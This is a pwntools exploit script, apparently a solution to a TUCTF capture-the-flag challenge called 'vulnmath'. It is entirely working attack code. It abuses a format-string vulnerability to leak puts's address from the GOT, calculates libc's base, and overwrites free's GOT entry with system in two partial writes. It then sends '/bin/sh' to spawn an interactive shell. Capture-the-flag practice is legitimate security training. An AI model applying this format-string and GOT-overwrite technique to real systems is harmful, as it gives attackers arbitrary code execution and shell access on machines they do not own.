from pwn import *

e = ELF("./vulnmath")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chal.tuctf.com", 30502)
else:
  p = process(e.path)

p.sendlineafter(">", p32(e.got["puts"]) + "%6$s")
p.recvuntil("Incorrect")
p.recvline()

p.recv(4)
leak = u32(p.recv(4)) - libc.symbols["puts"]

print("{:#x}".format(leak))

goal = leak + libc.symbols["system"]
first = goal % 0x10000
print("{:#x}".format(goal))

p.sendlineafter(">", p32(e.got["free"] + 2) 
  + ("%" + str(goal // 0x10000 - 14 + 1) + "x").ljust(16)
  + "%6$hn"
)

p.sendlineafter(">", p32(e.got["free"]) 
  + ("%" + str(goal % 0x10000 - 14 - 2 + 3) + "x").ljust(16)
  + "%6$hn"
)

p.sendlineafter(">", "A" * 0x1f)
p.sendlineafter(">", "A" * 0x1f)
p.sendlineafter(">", "/bin/sh\x00")

p.interactive()
